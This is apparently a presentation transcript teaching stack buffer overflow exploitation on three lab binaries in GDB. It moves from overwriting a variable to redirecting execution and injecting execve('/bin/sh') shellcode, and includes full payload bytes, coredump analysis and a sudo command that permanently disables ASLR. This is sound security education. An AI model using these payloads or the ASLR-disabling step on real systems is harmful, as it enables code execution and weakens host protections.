Introduction

In this presentation, I will demonstrate how an attacker can utilize a stack
buffer overflow to overwrite program data in memory, redirect program execution,
and ultimately, execute arbitrary code. To this end, I have written, compiled,
and prepared exploits for three vulnerable programs in increasing level of
complexity. Before we can start developing these exploits, we first need to
understand what really occurs during the execution of a program. To assist us in
this endeavor, we will make use of a debugger, which will allow us to examine
the binary in more detail, set breakpoints at which we can pause the program
during execution, and examine program memory. We will be using GDB, the GNU
Debugger.  Before we start using the debugger, let's take a look at what goes on
in the CPU and memory while a program is running. The specifics are particular
to the 32-bit x86 and 64-bit x86_64 instruction sets, but the generalities apply
to any CPU.

The CPU in execution strips away most forms of abstraction. What we will be
looking at is about as low-level as it gets before entering the fields of
hardware and electrical engineering. The CPU uses opcodes that are represented
in a human-readable format as assembly language (ASM). Each form of assembly
language is particular to its respective CPU architecture. This is why a binary
compiled for x86 won't work on ARM.

So, how does the CPU work with the data it needs? There are a few different
categories of memory, in increasing order of speed: disk, RAM, cache, and
registers. Each one is orders of magnitude faster than the last. We won't be
looking at disk or cache, and will only concern ourselves here with memory (RAM)
and registers.

Registers are where most operations happen and how the CPU manages itself. They
are the fastest form of memory available, and as such, they are in short supply,
especially in x86. In x86, there are 14 registers, but as some of these are just
for internal purposes, we will be looking at the 7 most relevant to execution.
First are the data registers: EAX, EBX, ECX, and EDX. The letter "E" denotes a
32-bit width. These are general-purpose registers that the CPU uses to make
calculations. Next, ESP and EBP, the stack pointer and base pointer,
respectively. These define the top and bottom of the current stack frame, which
will be discussed shortly. Finally, EIP, perhaps the most important, is the
instruction pointer. It points to the next instruction to be executed.
Controlling EIP is the ultimate goal of a code execution exploit. We will see
these registers after the first challenge.

The stack is where the CPU stores its execution context and program data such as
local and environment variables. The stack grows upwards as more memory is used,
from numerically higher addresses to numerically lower addresses. When a
function is being executed, the stack pointer points to the current top of the
stack, and the base pointer points to the bottom of the current stack frame. The
stack frame is the space of memory that is used by a particular function. When a
new function is being called, the current base pointer and instruction pointer
are stored at the top of the stack, and then a new stack frame is constructed
above that.

Now, with a bit of basic knowledge, we are ready to examine a program in
execution. In the interest of time, I will skim over some of the particulars of
operating GDB. The important thing is this: it allows us to examine the process
memory at different points in time using breakpoints to pause execution. I have
prepared premade command files for each program here, and we can use those as a
framework to see how GDB works.


vuln1

For our first program, vuln1, we can see in the source code that we have two
variables, buf and target, and that buf is populated using the gets() function.
The gets() function is extremely dangerous because it performs no bounds
checking. A string of unknown size is placed into a buffer without checking how
large it is. When it reaches the end of the buffer, it continues into memory
that belongs to other objects (objects in the general sense, not the OOP sense).
In this case, the target variable lies just past the end of the buffer.

Providing the input "AAAABBBBCCCCDDDD" will produce a value of 0, because the
string-terminating null byte has overwritten the byte containing the 1 that
target is set to by the program. We can show that we can control the value of
target by providing 20 bytes of input, this time adding 'E's after the 'D's:
"AAAABBBBCCCCDDDDEEEE". We now see that target contains the value 0x45454545.
0x45 is the hex code for ASCII 'E'. Now we need to be able to write arbitrary
bytes to get the value 0xdeadbeef. We can't type them in normally since they are
outside of the range of ASCII values. We can use echo's -e option to enable hex
encoding to produce these bytes, with a pipe to send the output of the command
to the binary's input:

$ echo -e 'AAAABBBBCCCCDDDD\xde\xad\xbe\xef' | ./vuln1
target = -272716322 (0xefbeadde)

As you can see, the bytes were reversed in memory. This is because x86 uses
little-endian byte order, where the least significant byte comes first and the
most significant byte comes last. We can solve this by placing our bytes in
little-endian order.

$ echo -e 'AAAABBBBCCCCDDDD\xef\xbe\xad\xde' | ./vuln1
The target was successfully modified.

We've completed the first challenge! Let's see what happens in the program
memory here using a premade gdbinit file. We can provide input to stdin from the
command line by using a triple-less-than, and a dollar sign with parentheses for
command replacement, so that we can use the output of this echo command.

$ gdb -x gdbinit1 vuln1
(gdb) r <<< $(echo -e 'AAAABBBBCCCCDDDD\xef\xbe\xad\xde')

The first breakpoint, before gets(), will display stack data and the local
variables. You can see where the variables are by checking the addresses
displayed. Continue to the next breakpoint.

(gdb) c

We can see exactly how the memory was overwritten, with the ability to write
past the boundary of the buffer variable.


vuln2

The stack does not just contain local variables. When the program needs to
return to a different function after the current function has been completed, it
uses an address stored on the stack, which contains the address after the call
instruction that started the current function. Here is an overview of how that
works.

This is a diagram of the stack before a function is left. The stack pointer
points to the top of the stack, and the base pointer points to the bottom of the
current stack frame, below which are the base pointer and instruction pointer
that were stored by the caller.  Anything above the stack pointer is considered
uninitialized memory, and accessing it is undefined within C and
nondeterministic within assembly.

The first instruction, `mov esp, ebp` places the current value of EBP into ESP.
This discards the current stack pointer and prepares the next instruction.

The next instruction, `pop ebp`, places the value currently pointed to by ESP
into EBP, then moves the stack pointer below that value. As you can see, EBP has
returned to the caller's stack frame and the stack pointer has been moved below
the stored EBP value.

Finally, the `ret` instruction is a synonym for `pop eip`. It takes the value at
the top of the stack, places it into EIP, and moves the stack pointer below that
value. The caller's stack frame has now been reconstructed using the stored
data.

The instruction pointer now points back to the caller after the ret instruction,
continuing execution as normal.

Now, let's see how we can use this same vulnerability to redirect program
execution by overwriting the stored return pointer. In the second program, we
only have the buffer and a gets() call in main, and a separate win() function
that we need to call. The images where I detail how leaving a function works
show us how, if we have a stack buffer overflow, we can overwrite the stored
EIP on the stack. To demonstrate this, let's provide a long string as input
after opening the program in gdb.

$ gdb -x gdbinit2 vuln2
(gdb) r <<< $(echo 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH')

The first breakpoint is again before gets, and we can see that the gdbinit
script shows us where the stored value of EIP is. At the second breakpoint, we
can see that the address containing the stored EIP has been overwritten. When we
continue, we can see that the program crashes when it tries to access the
instruction at 0x48484848, hex for HHHH. Let's see where the win() function is
so that we can jump to it.

(gdb) x/wx win
0x80483f4 <win>:        0x83e58955

Now that we have this address, let's update our exploit.

(gdb) r <<< $(echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xf4\x83\x04\x08HHHH')

At the second breakpoint, we can see that the stored EIP on the stack has been
overwritten. When we continue, we see "Execution successfully redirected",
followed by a segmentation fault. EIP is now the value that we placed after the
return pointer to win(). We can execute the win() function and then control EIP
after that as well. This can be used for more advanced exploits called ROP, or
return-oriented programming, where snippets of code in the program ending with a
'ret' instruction are chained together to avoid having to use code on the stack
if it is not executable, as is the case on all modern machines. However, this is
beyond the scope of our current topic.


vuln3

Finally, let's see how controlling EIP can allow us to run our own code. The
third and final program contains only two lines: the buffer declaration and
gets(). Where will we find the code to execute this time? Simple: we will
provide it ourselves, in our input. This is also the first time that the
difference in stack locations between normal execution and debugging becomes
relevant, as we will see shortly. First, let's develop a working exploit in gdb,
then modify it as necessary.

First, let's find the location of EIP on the stack so that we can overwrite it.

$ gdb -x gdbinit3 vuln3
(gdb) r <<< $(echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ')
(gdb) c

We can see at breakpoint 2 that EIP has been overwritten with 0x48484848, or
"HHHH". EIP is stored at 0xffffd03c, so we need to use the address 0xffffd040 to
point EIP onto our stack data after the return address. In x86, the opcode int3,
represented in hex as 0xCC, is a debug trap that we can use to pause execution
when our code is executed.

(gdb) r <<< $(echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\x40\xd0\xff\xff\xcc')
(gdb) c

We have overwritten the stored EIP with the address containing our debug trap.

(gdb) x/i 0xffffd040
  0xffffd040:  int3
(gdb) c
Program received signal SIGTRAP, Trace/breakpoint trap.


We have code execution! We can now replace the debug trap with shellcode. We
will be using one of the shellcodes at exploit-db.com. We will be using code
that executes execve("/bin/sh", NULL, NULL). This can be found at
https://www.exploit-db.com/shellcodes/46809. execve() executes the given command
on the underlying system. The two following arguments are the arguments for the
command and the environment variables, but these are not needed for this
exploit.

(gdb) r <<< $(echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\x40\xd0\xff\xff\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')
(gdb) c

We can see that EIP has been overwritten as expected, and we can make sure our
shellcode was written properly using the x/i command. The shellcode sets up the
stack to contain the string "/bin/sh", the uses the 0x80 interrupt at the end to
use the execute command syscall.

(gdb) x/8i 0xffffd040
   0xffffd040:  xor    ecx,ecx
   0xffffd042:  push   0xb
   0xffffd044:  pop    eax
   0xffffd045:  push   ecx
   0xffffd046:  push   0x68732f2f
   0xffffd04b:  push   0x6e69622f
   0xffffd050:  mov    ebx,esp
   0xffffd052:  int    0x80
(gdb) c
process 30136 is executing new program: /bin/dash

Our exploit works! We've managed to open a shell. Let's take it out of the
debugger.

$ echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\x40\xd0\xff\xff\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' | ./vuln3
Illegal instruction (core dumped)

The program crashed! Why did this happen? Our exploit is dependent on the
location of the stack, so EIP didn't actually point to our shellcode. When
running the program with gdb, there are more environment variables below it on
the stack, so when we are not using GDB, the address of the shellcode is lower
on the stack (a numerically higher address). We can see this by starting the
program in gdb and using the string examine command on the stack. We can then
see that the environment variables are placed on the stack.

$ gdb -x gdbinit3 vuln3
(gdb) r <<< 'AAAABBBB'
(gdb) c
(gdb) x/300s $esp

Trying to determine the location of the stack outside of a debugger is rather
tricky, because we can't look directly into the program memory while it's
running. However, there is an alternative: coredumps. A coredump is a record of
a program's execution that is collected when it crashes. Run the program with
the exploit, then use the following command:

$ coredumpctl gdb

This opens the most recent coredump in gdb.

Core was generated by `./vuln3'.
Program terminated with signal SIGILL, Illegal instruction.
#0  0xffff0d052

Let's see where the stack is. Since the stack frame we need to look at is now
above esp, we'll subtract from esp's address when examining memory.

(gdb) x/32wx $esp-0x20

We can see that our shellcode begins at 0xffffd0b0 with the value 0x0b6ac931
(see the first four bytes "\x31\xc9\x6a\x0b").

If you are following along yourself and do not see this address, make sure that
address randomization is disabled with cat /proc/sys/kernel/randomize_va_space.
If it displays '1' or '2', use these two commands to disable it permanently,
providing "user" as the sudo password if prompted.

$ sudo sh -c 'echo "kernel.randomize_va_space=0" >> /etc/sysctl.conf'
$ sudo sysctl -p

Let's use this address and run our exploit again.

$ echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xb0\xd0\xff\xff\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' | ./vuln3

As we can see, there is no output. So what happened to the program? Our exploit
seems to have worked, so why didn't we open a shell? The answer lies in how we
provided our input to the program. Since we've used a pipe from echo, the input
ends after our shellcode. We can use cat to copy input from stdin to stdout and
parentheses to group the commands together. If we had a file containing the
exploit data, we could also use cat with the filename followed by a dash,
indicating stdin.

$ (echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xb0\xd0\xff\xff\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'; cat) | ./vuln3
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(lpadmin),128(sambashare)
^D
$ echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xb0\xd0\xff\xff\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' > exploit.bin
$ cat exploit.bin - | ./vuln3
id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),112(lpadmin),128(sambashare)
^D

We now have a working exploit to gain code execution via a stack buffer
overflow! This is a very basic exploit, and over the last few decades, binary
security measures have gotten more advanced, such as non-executable stack and
heap, address randomization, and stack canaries. There are methods to evade
these measures, but they tend to make exploits less reliable and more
complicated and difficult to develop. There are also more recent CPU security
features, such as CFI (control flow integrity), which implements a hardware
check for each return pointer through a cookie that occupies unused bits in
64-bit address space [1].

This presentation was created using free and open source software on the Linux
Mint 19.3 [2] operating system. Vim [3] was used for writing the source code,
gdb scripts, and exploits. GIMP [4] was used to create the images, and Open
Broadcaster Software, or OBS [5], was used to record the video. The GNU Compiler
Collection, or GCC [6], was used to compile the binaries. To learn more about
free and open source software, go to the GNU website at www.gnu.org [7]. All
files for which I control the copyright are released into the public domain via
the Unlicense [8].

The files for this presentation as well as the virtual machine image being used
are available for download at my github page [9], including exploits written in
Python that show how a basic resusable exploit can be written. The virtual
machine is in VirtualBox appliance format. It should work with any reasonably
recent version of VirtualBox, but compatibility with other virtualization
software such as VMWare Workstation or Xen is not guaranteed. For best results,
use VirtualBox, which is available for download for free for Windows, MacOS,
Linux, and Solaris at virtualbox.org [10].

If you would like to explore the topic of binary exploitation further, you can
download the Protostar machine [11] at exploit.education and complete the
challenges [12]. The LiveOverflow channel on Youtube contains a playlist [13]
that goes over all of these challenges and goes into more depth.

I hope that you decide to learn more about this topic, whether it's to discover
vulnerabilities before they are exploited in the wild, or to develop the
protective measures of the future. Thank you for listening.

Sources:

[1]: https://www.qualcomm.com/media/documents/files/whitepaper-pointer-authentication-on-armv8-3.pdf
[2]: https://linuxmint.com
[3]: https://www.vim.org
[4]: https://www.gimp.org
[5]: https://obsproject.org
[6]: https://gcc.gnu.org
[7]: https://www.gnu.org
[8]: https://unlicense.org
[9]: https://github.com/lazula/presentation-binary-exploitation-fundamentals
[10]: https://virtualbox.org/wiki/Downloads
[11]: http://exploit.education/downloads
[12]: http://exploit.education/protostar
[13]: https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
